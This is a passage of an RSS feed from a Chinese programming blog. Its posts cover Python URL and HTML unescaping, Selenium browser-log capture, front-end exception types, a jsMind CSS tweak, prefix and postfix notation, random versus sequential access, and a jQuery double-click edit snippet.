&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;() {
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;use strict&amp;#39;&lt;/span&gt;;

    &lt;span style=&#34;color:#75715e&#34;&gt;// Your code here...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;})();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python—html 反转义</title>
        <link>https://ac-lm.github.io/posts/python/pythonhtml-%E5%8F%8D%E8%BD%AC%E4%B9%89/</link>
        <pubDate>Thu, 16 Jun 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonhtml-%E5%8F%8D%E8%BD%AC%E4%B9%89/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考：&lt;a class=&#34;link&#34; href=&#34;https://wenku.baidu.com/view/4a893f47deccda38376baf1ffc4ffe473368fd80.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Python爬虫之转义和反转义使用方法 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在 HTML 中，部分中文与符号需要进行转义才能进行储存，这就导致了在爬取中无法爬取真实内容的问题&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; html
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; urllib.parse &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; urlparse
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; urllib.parse &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; urljoin
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; urllib.parse &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; urlencode, parse_qs, parse_qsl
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; urllib.parse &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; quote, unquote

__author__ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Evan&amp;#39;&lt;/span&gt;
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;返回⼀个ParseResult类型的对象: &amp;#39;&lt;/span&gt;, urlparse(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://www.baidu.com/index.html;user?id=5#comment&amp;#39;&lt;/span&gt;))
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;合并两个字符串组合成⼀个完整的URL: &amp;#39;&lt;/span&gt;, urljoin(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://www.baidu.com&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;index.html&amp;#39;&lt;/span&gt;))
params &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Evan&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;77&amp;#39;&lt;/span&gt;}
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;将字典序列化为Get请求参数: &amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://www.baidu.com?&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; urlencode(params))
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;将Get请求参数反序列化为字典: &amp;#39;&lt;/span&gt;, parse_qs(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://www.baidu.com?name=Evan&amp;amp;id=77&amp;#39;&lt;/span&gt;))
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;将Get请求参数反序列化为列表: &amp;#39;&lt;/span&gt;, parse_qsl(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://www.baidu.com?name=Evan&amp;amp;id=77&amp;#39;&lt;/span&gt;))
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;将中⽂转化为URL编码: &amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://www.baidu.com?&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; quote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;年龄&amp;#39;&lt;/span&gt;))
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;将URL编码转化为中⽂: &amp;#39;&lt;/span&gt;, unquote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://www.baidu.com?&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%E&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;5%B9%B4&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%E&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;9%BE%84&amp;#39;&lt;/span&gt;))
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTML格式反转义成字符: &amp;#39;&lt;/span&gt;, html&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unescape(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https&amp;amp;#x3a;&amp;amp;#x2f;&amp;amp;#x2f;127.0.0.1&amp;amp;#x2f;report&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python—selenium 控制台报错监听</title>
        <link>https://ac-lm.github.io/posts/python/pythonselenium-%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%8A%A5%E9%94%99%E7%9B%91%E5%90%AC/</link>
        <pubDate>Thu, 16 Jun 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonselenium-%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%8A%A5%E9%94%99%E7%9B%91%E5%90%AC/</guid>
        <description>&lt;h2 id=&#34;1实现&#34;&gt;1.实现&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;_options &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; EdgeOptions()
d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; DesiredCapabilities&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;EDGE
d[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;loggingPrefs&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;browser&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ALL&amp;#39;&lt;/span&gt;}
_driver_path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;msedgedriver.exe&amp;#39;&lt;/span&gt;
_browser &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Edge(service&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Service(executable_path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;_driver_path), options&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;_options, capabilities&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;d)
_browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://1.1.1.1&amp;#39;&lt;/span&gt;)
sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; entry &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; _browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_log(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;browser&amp;#39;&lt;/span&gt;):
    print(entry)
_browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2loggingprefs&#34;&gt;2.loggingPrefs&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;LogType&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; String BROWSER &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;browser&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; String CLIENT &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;client&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; String DRIVER &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;driver&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; String PERFOMANCE &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;performance&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; String PROFILER &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;profiler&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; String SERVER &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;server&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>随记—前端中的异常</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E5%89%8D%E7%AB%AF%E4%B8%AD%E7%9A%84%E5%BC%82%E5%B8%B8/</link>
        <pubDate>Thu, 16 Jun 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E5%89%8D%E7%AB%AF%E4%B8%AD%E7%9A%84%E5%BC%82%E5%B8%B8/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考：&lt;a class=&#34;link&#34; href=&#34;https://segmentfault.com/a/1190000041879217&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 前端监控 @杨成功 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;一个项目中的异常总体可以分为两大类，一类是前端异常，一类是接口异常。&lt;/p&gt;
&lt;h2 id=&#34;a前端异常&#34;&gt;a.前端异常&lt;/h2&gt;
&lt;p&gt;前端异常总结起来大概可以分为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;JS 代码执行异常&lt;/li&gt;
&lt;li&gt;Promise 异常&lt;/li&gt;
&lt;li&gt;静态资源加载异常&lt;/li&gt;
&lt;li&gt;console.error 异常&lt;/li&gt;
&lt;li&gt;跨域异常&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;b接口异常&#34;&gt;b.接口异常&lt;/h2&gt;
&lt;p&gt;接口异常属于后端的异常，但是接口异常会直接导致前端页面错误，因此这类异常是我们判断线上问题根源的重要依据。接口异常可以根据响应结果分类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;未响应/超时响应异常&lt;/li&gt;
&lt;li&gt;4xx 请求异常&lt;/li&gt;
&lt;li&gt;5xx 服务器异常&lt;/li&gt;
&lt;li&gt;权限不足&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>随记—jsMind 多行展示修改</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0jsmind-%E5%A4%9A%E8%A1%8C%E5%B1%95%E7%A4%BA%E4%BF%AE%E6%94%B9/</link>
        <pubDate>Mon, 13 Jun 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0jsmind-%E5%A4%9A%E8%A1%8C%E5%B1%95%E7%A4%BA%E4%BF%AE%E6%94%B9/</guid>
        <description>&lt;h2 id=&#34;1事件&#34;&gt;1.事件&lt;/h2&gt;
&lt;p&gt;jsMind 的节点默认以一行展示所有内容，当数据过多时不会进行折行，过多的数据会被折叠&lt;/p&gt;
&lt;h2 id=&#34;2修改&#34;&gt;2.修改&lt;/h2&gt;
&lt;p&gt;修改 &lt;strong&gt;jsmind.css&lt;/strong&gt; 里如下内容&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;jmnodes&lt;/span&gt;{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;position&lt;/span&gt;:&lt;span style=&#34;color:#66d9ef&#34;&gt;absolute&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;z-index&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;background-color&lt;/span&gt;:rgba(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;min-width&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;420&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
}
&lt;span style=&#34;color:#f92672&#34;&gt;jmnode&lt;/span&gt;{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;position&lt;/span&gt;:&lt;span style=&#34;color:#66d9ef&#34;&gt;absolute&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;cursor&lt;/span&gt;:&lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;max-width&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>随记—前缀式，中缀式和后缀式</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E5%89%8D%E7%BC%80%E5%BC%8F%E4%B8%AD%E7%BC%80%E5%BC%8F%E5%92%8C%E5%90%8E%E7%BC%80%E5%BC%8F/</link>
        <pubDate>Mon, 13 Jun 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E5%89%8D%E7%BC%80%E5%BC%8F%E4%B8%AD%E7%BC%80%E5%BC%8F%E5%92%8C%E5%90%8E%E7%BC%80%E5%BC%8F/</guid>
        <description>&lt;h2 id=&#34;1前缀式&#34;&gt;1.前缀式&lt;/h2&gt;
&lt;p&gt;前缀式又称波兰式，是一种没有括号的算术表达式。其特点是将运算符写在前面，操作数写在后面。例如算式：1 - ( 2 + 3 ) ，等价于 - 1 + 2 3&lt;/p&gt;
&lt;h2 id=&#34;2中缀式&#34;&gt;2.中缀式&lt;/h2&gt;
&lt;p&gt;中缀式就是平时人们常用的算术表示方法，操作符处于操作数的中间。例如算式：3 + 4&lt;/p&gt;
&lt;h2 id=&#34;3后缀式&#34;&gt;3.后缀式&lt;/h2&gt;
&lt;p&gt;后缀式又称逆波兰式。与前缀式不同的是，后缀式把运算符写在运算对象的后面。例如算式：a + b，等价于 a b + 。这种写法的优点是，可以根据运算对象和算符的出现次序进行计算，而不需要使用括号，便于机器求值&lt;/p&gt;
&lt;h2 id=&#34;4中缀式转化前后缀式&#34;&gt;4.中缀式转化前、后缀式&lt;/h2&gt;
&lt;p&gt;中缀式可以通过构造二叉树，通过后序遍历二叉树的方法求得后缀式，通过先序遍历二叉树的方法求得前缀式。例如算式： ( 1 + 2 ) * 3 + 2 * 1&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202206131636723.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202206131636723.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;后序遍历的实现思想是：从根节点出发，依次遍历各节点的左右子树，直到当前节点左右子树遍历完成后，才访问该节点元素&lt;/li&gt;
&lt;li&gt;先序遍历的实现思想是：从根节点出发，先访问根节点，再访问当前节点的左子树，若当前节点无左子树，访问当前节点的右子树，直至所有元素被访问&lt;/li&gt;
&lt;li&gt;中序遍历的实现思想是：从当前节点出发，先当前节点的左子树，再访问根节点最后再访问右子树&lt;/li&gt;
&lt;li&gt;后序遍历：1 2 + 3 * 2 1 * +&lt;/li&gt;
&lt;li&gt;先序遍历： + * + 1 2 3 * 2 1&lt;/li&gt;
&lt;li&gt;中序遍历：( 1 + 2 ) * 3 + 2 * 1&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5栈&#34;&gt;5.栈&lt;/h2&gt;
&lt;p&gt;前后缀式都是使用栈进行储存，遵循后进先出的原则。例如使用栈计算后缀式：xyc + 8 * -，【中缀式：x - ( y + c ) * 8】&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;栈依序存入 x，y，c&lt;/li&gt;
&lt;li&gt;遵循后进先出，取出 c，y，进行加法运算得 y + c，存入栈中，此时栈底为 x，栈顶为 y + c&lt;/li&gt;
&lt;li&gt;存入 8&lt;/li&gt;
&lt;li&gt;取出 8，y + c，进行乘法运算得 ( y + c ) * 8，入栈&lt;/li&gt;
&lt;li&gt;取出 ( y + c ) * 8，x，进行减法运算得 x - ( y + c ) * 8，注意后取出的 x 为被减数&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>随记—随机存取与顺序存取</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E9%9A%8F%E6%9C%BA%E5%AD%98%E5%8F%96%E4%B8%8E%E9%A1%BA%E5%BA%8F%E5%AD%98%E5%8F%96/</link>
        <pubDate>Mon, 13 Jun 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E9%9A%8F%E6%9C%BA%E5%AD%98%E5%8F%96%E4%B8%8E%E9%A1%BA%E5%BA%8F%E5%AD%98%E5%8F%96/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考：&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/agonie201218/article/details/123910423&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 什么是随机存取与顺序存取？@Young &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1-随机存取&#34;&gt;1. 随机存取&lt;/h2&gt;
&lt;p&gt;随机存取就是直接存取，可以通过下标直接访问元素，与存储位置无关，时间复杂度永远为O(1)。例如数组，存取第N个数据时，不需要访问前 N-1 个数据，可以直接对第 N 个数据操作。&lt;/p&gt;
&lt;h2 id=&#34;2顺序存取&#34;&gt;2.顺序存取&lt;/h2&gt;
&lt;p&gt;非随机存取也叫顺序存取，不能通过下标访问，在存取第 N 个数据时，必须先访问前 N-1 个数据 ，例如链表&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202206131706981.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202206131706981.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Web开发—双击修改的实现</title>
        <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E5%8F%8C%E5%87%BB%E4%BF%AE%E6%94%B9%E7%9A%84%E5%AE%9E%E7%8E%B0/</link>
        <pubDate>Wed, 25 May 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E5%8F%8C%E5%87%BB%E4%BF%AE%E6%94%B9%E7%9A%84%E5%AE%9E%E7%8E%B0/</guid>
        <description>&lt;h2 id=&#34;1实现&#34;&gt;1.实现&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.edit&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dblclick&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;event&lt;/span&gt;){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;event&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;target&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;innerHTML&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;indexOf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;type=&amp;#34;text&amp;#34;&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ){  &lt;span style=&#34;color:#75715e&#34;&gt;//判断是否进入编辑状态
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;newdiv&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;createElement&lt;/span&gt;( &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;input&amp;#39;&lt;/span&gt; )&lt;span style=&#34;color:#75715e&#34;&gt;//创建一个input标签
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;newdiv&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;text&amp;#39;&lt;/span&gt;                          &lt;span style=&#34;color:#75715e&#34;&gt;//设置标签类型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;newdiv&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;className&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;edit-input&amp;#39;&lt;/span&gt;      
    &lt;span style=&#34;color:#a6e22e&#34;&gt;newdiv&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;innerHTML&lt;/span&gt;                    &lt;span style=&#34;color:#75715e&#34;&gt;//将原来文本内容赋值给input标签
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;innerHTML&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;             &lt;span style=&#34;color:#75715e&#34;&gt;//清除原来的内容
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;appendChild&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;newdiv&lt;/span&gt;)        &lt;span style=&#34;color:#75715e&#34;&gt;//将input标签添加到元素中
